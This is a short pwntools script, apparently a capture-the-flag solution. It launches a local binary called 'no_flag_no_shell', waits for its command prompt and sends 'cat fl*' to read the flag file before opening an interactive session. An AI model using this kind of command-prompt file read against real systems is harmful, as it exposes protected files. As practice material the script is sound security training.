from pwn import *

r = process('./no_flag_no_shell')

r.recvuntil(b'Enter a command: ')

r.sendline(b'cat fl*')
r.interactive()